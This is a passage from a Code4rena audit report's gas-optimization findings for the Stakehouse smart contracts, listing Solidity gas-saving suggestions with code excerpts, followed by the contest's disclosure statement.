gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**.\n\n*There are 16 instances of this issue.*\n\n## [G&#x2011;07] `internal` functions only called once can be inlined to save gas\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 9 instances of this issue.*\n\n## [G&#x2011;08] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\nThe `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.\n\n*There are 38 instances of this issue.*\n\n## [G&#x2011;09] `require()`/`revert()` strings longer than 32 bytes cost extra gas\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There are 39 instances of this issue.*\n\n## [G&#x2011;10] Optimize names to save gas\n`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. In this report are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 16 instances of this issue.*\n\n## [G&#x2011;11] `internal` functions not called by the contract should be removed to save deployment gas\nIf the functions are required by an interface, the contract should inherit from that interface and use the `override` keyword.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/syndicate/Syndicate.sol\n\n538:      function _calculateCollateralizedETHOwedPerKnot() internal view returns (uint256) {\n\n545:      function _calculateNewAccumulatedETHPerCollateralizedShare(uint256 _ethSinceLastUpdate) internal view returns (uint256) {\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L538\n\n## [G&#x2011;12] Don't compare boolean expressions to boolean literals\n`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n*There are 19 instances of this issue.*\n\n## [G&#x2011;13] Ternary unnecessary\n`z = (x == y) ? true : false` => `z = (x == y)`\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/smart-wallet/OwnableSmartWallet.sol\n\n145:          return from == to ? true : _isTransferApproved[from][to]; // F: [OSW-2, 3]\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/smart-wallet/OwnableSmartWallet.sol#L145\n\n## [G&#x2011;14] Division by two should use bit shifting\n`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/syndicate/Syndicate.sol\n\n378:          return ethPerKnot / 2;\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L378\n\n## [G&#x2011;15] Stack variable used as a cheaper cache for a state variable is only used once\nIf the variable is only accessed once, it's cheaper to use the state variable directly that one time, and save the **3 gas** the extra stack assignment would spend.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/syndicate/Syndicate.sol\n\n388:          uint256 currentAccumulatedETHPerFreeFloatingShare = accumulatedETHPerFreeFloatingShare;\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L388\n\n## [G&#x2011;16] Empty blocks should be removed or emit something \nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`). Empty `receive()`/`fallback() payable` functions that are not used, can be removed to save deployment gas.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/syndicate/Syndicate.sol\n\n194           } else {\n195               // todo - check else case for any ETH lost\n196:          }\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L194-L196\n\n## [G&#x2011;17] Use custom errors rather than `revert()`/`require()` strings to save gas\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 21 instances of this issue.*\n\n## [G&#x2011;18] Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 20 instances of this issue.*\n\n## Excluded Gas Findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;19] | `<array>.length` should not be looked up in every loop of a `for`-loop | 16 | 48 |\n| [G&#x2011;20] | Using `bool`s for storage incurs overhead | 9 | 153900 |\n| [G&#x2011;21] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 1 | 5 |\n| [G&#x2011;22] | Using `private` rather than `public` for constants, saves gas | 4 | - |\n| [G&#x2011;23] | Use custom errors rather than `revert()`/`require()` strings to save gas | 198 | - |\n\nTotal: 228 instances over 5 issues with **153953 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.\n\n### [G&#x2011;19] `<array>.length` should not be looked up in every loop of a `for`-loop\nThe overheads outlined in this report are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 16 instances of this issue.*\n\n### [G&#x2011;20] Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27<br>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.\n\n*There are 9 instances of this issue.*\n\n### [G&#x2011;21] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)\nSaves **5 gas per loop**\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/liquid-staking/ETHPoolLPFactory.sol\n\n/// @audit (valid but excluded finding)\n141:              numberOfLPTokensIssued++;\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/ETHPoolLPFactory.sol#L141\n\n## [G&#x2011;22] Using `private` rather than `public` for constants, saves gas\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 4 instances of this issue.*\n\n## [G&#x2011;23] Use custom errors rather than `revert()`/`require()` strings to save gas\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 198 instances of this issue.*\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}